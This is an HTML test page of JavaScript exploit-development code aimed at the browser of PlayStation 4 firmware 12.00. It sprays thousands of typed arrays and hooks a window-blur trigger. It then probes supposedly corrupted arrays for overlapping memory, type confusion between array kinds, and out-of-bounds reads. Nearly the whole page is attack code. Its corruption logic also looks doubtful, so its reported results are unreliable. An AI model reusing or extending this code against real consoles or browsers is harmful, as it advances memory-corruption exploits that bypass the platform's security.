<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 Advanced Tests (Fixed Trigger)</title>
<style>
    body { background-color: #f0f0f0; font-family: monospace; padding: 20px; }
    button { padding: 10px; font-size: 14px; cursor: pointer; }
    div { background: white; border: 1px solid #ccc; padding: 10px; margin-top: 5px; }
</style>
</head>
<body>

<h1>PS4 12.00 - ADVANCED CONFUSION TESTS (FIXED)</h1>

<h2>STAGE 1: Create First Corrupted with Markers</h2>
<button onclick="stage1()">CREATE FIRST</button>
<div id="s1"></div>

<script>
var g_first = null;
var g_arrays = [];

// Função auxiliar para configurar o gatilho com segurança
function setupTrigger(callback, logElement) {
    // 1. Entra em fullscreen
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    // 2. Garante o foco na janela
    window.focus();

    logElement.innerHTML += 'Wait...<br>';

    // 3. Define o evento com delay para evitar conflito com a transição de tela
    setTimeout(() => {
        logElement.innerHTML += '<b>READY! Click screen once, then press OPTIONS.</b><br>';
        
        window.onblur = function() {
            logElement.innerHTML += 'Trigger detected!<br>';
            window.onblur = null; // Limpa o evento imediatamente
            callback(); // Executa o payload
        };
    }, 1000);
}

function stage1() {
    const r = document.getElementById('s1');
    r.innerHTML = 'Creating arrays with markers<br>';
    
    const P = 2.121995791e-314;
    g_arrays = [];
    
    for(let i = 0; i < 5000; i++) {
        const a = new Float64Array(8);
        a[0] = i;
        a[1] = i + 10000;
        a[2] = i + 20000;
        g_arrays.push(a);
    }
    
    setupTrigger(function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            const s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        const corrupted = g_arrays.filter(a => a[0] === P);
        
        if(corrupted.length > 0) {
            g_first = corrupted[0];
            
            const view = new DataView(g_first.buffer);
            view.setUint32(0, 0xAAAAAAAA, true);
            view.setUint32(4, 0xBBBBBBBB, true);
            view.setBigUint64(8, 0xCCCCCCCCDDDDDDDDn, true);
            view.setBigUint64(16, 0xEEEEEEEEFFFFFFFFn, true);
            
            r.innerHTML += '<b>✓ First array corrupted and marked</b><br>';
            r.innerHTML += 'Markers written.<br>';
        } else {
            r.innerHTML += 'Failed to find corrupted array.<br>';
        }
    }, r);
}
</script>

<hr>

<h2>TEST 1: Float64Array Inheritance</h2>
<button onclick="test1()">RUN TEST 1</button>
<div id="t1"></div>

<script>
function test1() {
    const r = document.getElementById('t1');
    r.innerHTML = '';
    
    if(!g_first) { r.innerHTML = 'Run STAGE 1 first<br>'; return; }
    
    r.innerHTML = '<b>TEST 1: Float64Array -> Float64Array</b><br>';
    
    setupTrigger(function() {
        const P = 2.121995791e-314;
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            const s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        const corrupted = g_arrays.filter(a => a[0] === P);
        
        if(corrupted.length > 1) {
            const g_second = corrupted[1];
            r.innerHTML += '<b>Got second array</b><br>';
            
            const view2 = new DataView(g_second.buffer);
            const m1 = view2.getUint32(0, true);
            const m2 = view2.getUint32(4, true);
            
            r.innerHTML += 'Offset 0: 0x' + m1.toString(16) + (m1 === 0xAAAAAAAA ? ' ✓ MATCH!' : '') + '<br>';
            r.innerHTML += 'Offset 4: 0x' + m2.toString(16) + (m2 === 0xBBBBBBBB ? ' ✓ MATCH!' : '') + '<br>';
            
            g_first[7] = 123.456;
            const check = g_second[7];
            r.innerHTML += 'Sanity (123.456): ' + check + '<br>';
        } else {
            r.innerHTML += 'Second corruption failed.<br>';
        }
    }, r);
}
</script>

<hr>

<h2>TEST 2: Float64Array -> Uint32Array</h2>
<button onclick="test2()">RUN TEST 2</button>
<div id="t2"></div>

<script>
function test2() {
    const r = document.getElementById('t2');
    r.innerHTML = '';
    
    if(!g_first) { r.innerHTML = 'Run STAGE 1 first<br>'; return; }
    
    r.innerHTML = '<b>TEST 2: Uint32Array</b><br>';
    
    const spray = [];
    for(let i = 0; i < 5000; i++) {
        const a = new Uint32Array(16);
        a.fill(0x42424242);
        spray.push(a);
    }
    r.innerHTML += 'Uint32Arrays created. Checking...<br>';
    
    let found = false;
    for(let i = 0; i < spray.length; i++) {
        const view2 = new DataView(spray[i].buffer);
        // Otimização: check apenas primeiros bytes
        if(view2.getUint32(0, true) === 0xAAAAAAAA) {
             r.innerHTML += '<b>✓ Uint32Array[' + i + '] overlap confirmed!</b><br>';
             found = true;
             
             spray[i][0] = 0x99999999;
             const buf = new ArrayBuffer(8);
             new Float64Array(buf)[0] = g_first[0];
             const check = new Uint32Array(buf)[0];
             
             r.innerHTML += 'Write check: 0x' + check.toString(16) + '<br>';
             break;
        }
    }
    
    if(!found) r.innerHTML += 'No overlap found in Test 2.<br>';
}
</script>

<hr>

<h2>TEST 3: Float64Array -> DataView</h2>
<button onclick="test3()">RUN TEST 3</button>
<div id="t3"></div>

<script>
function test3() {
    const r = document.getElementById('t3');
    r.innerHTML = '';
    
    if(!g_first) { r.innerHTML = 'Run STAGE 1 first<br>'; return; }
    
    const spray = [];
    for(let i = 0; i < 1000; i++) {
        const buf = new ArrayBuffer(64);
        const dv = new DataView(buf);
        for(let j = 0; j < 64; j += 4) dv.setUint32(j, 0x55550000 + i, true);
        spray.push(dv);
    }
    
    r.innerHTML += 'DataViews created. Checking...<br>';
    
    let found = false;
    for(let i = 0; i < spray.length; i++) {
        if(spray[i].getUint32(0, true) === 0xAAAAAAAA) {
            r.innerHTML += '<b>✓ DataView[' + i + '] overlap confirmed!</b><br>';
            found = true;
            break;
        }
    }
    if(!found) r.innerHTML += 'No overlap found in Test 3.<br>';
}
</script>

<hr>

<h2>TEST 4: Float64Array -> ArrayBuffer</h2>
<button onclick="test4()">RUN TEST 4</button>
<div id="t4"></div>

<script>
function test4() {
    const r = document.getElementById('t4');
    r.innerHTML = '';
    
    if(!g_first) { r.innerHTML = 'Run STAGE 1 first<br>'; return; }
    
    const spray = [];
    for(let i = 0; i < 5000; i++) {
        const buf = new ArrayBuffer(64);
        new Uint8Array(buf).fill(0x77);
        spray.push(buf);
    }
    
    r.innerHTML += 'ArrayBuffers created. Checking...<br>';
    
    let found = false;
    for(let i = 0; i < spray.length; i++) {
        const view = new Uint32Array(spray[i]);
        if(view[0] === 0xAAAAAAAA) {
             r.innerHTML += '<b>✓ ArrayBuffer[' + i + '] overlap confirmed!</b><br>';
             found = true;
             break;
        }
    }
    if(!found) r.innerHTML += 'No overlap found in Test 4.<br>';
}
</script>

<hr>

<h2>TEST 5: Property Inheritance</h2>
<button onclick="test5()">RUN TEST 5</button>
<div id="t5"></div>

<script>
function test5() {
    const r = document.getElementById('t5');
    r.innerHTML = '';
    if(!g_first) { r.innerHTML = 'Run STAGE 1 first<br>'; return; }
    
    g_first.customMarker = { id: 'UNIQUE', value: 0xDEADBEEF };
    r.innerHTML += 'Property set on g_first.<br>';
    
    setupTrigger(function() {
        const P = 2.121995791e-314;
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            spray.push(new Float64Array(10));
            spray[i].fill(P);
        }
        
        const corrupted = g_arrays.filter(a => a[0] === P);
        if(corrupted.length > 1) {
            const g_second = corrupted[corrupted.length - 1];
            if(g_second.customMarker) {
                r.innerHTML += '<b>✓✓ PROPERTY INHERITED!</b><br>';
                r.innerHTML += 'Value: 0x' + g_second.customMarker.value.toString(16) + '<br>';
            } else {
                r.innerHTML += 'Property NOT inherited.<br>';
            }
        }
    }, r);
}
</script>

<hr>

<h2>TEST 6: OOB Fresh Array</h2>
<button onclick="test6()">RUN TEST 6</button>
<div id="t6"></div>

<script>
function test6() {
    const r = document.getElementById('t6');
    r.innerHTML = '';
    if(!g_first) { r.innerHTML = 'Run STAGE 1 first<br>'; return; }
    
    setupTrigger(function() {
        const P = 2.121995791e-314;
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            spray.push(new Float64Array(10));
            spray[i].fill(P);
        }
        
        const corrupted = g_arrays.filter(a => a[0] === P);
        if(corrupted.length > 1) {
            const g_second = corrupted[corrupted.length - 1];
            r.innerHTML += 'Checking OOB...<br>';
            
            try {
                const val = g_second[10]; // Test index 10
                if(val !== undefined) {
                     r.innerHTML += '<b>✓ OOB Read Success:</b> ' + val + '<br>';
                } else {
                     r.innerHTML += 'OOB Read Undefined.<br>';
                }
            } catch(e) {
                r.innerHTML += 'Error: ' + e.message + '<br>';
            }
        }
    }, r);
}
</script>

</body>
</html>
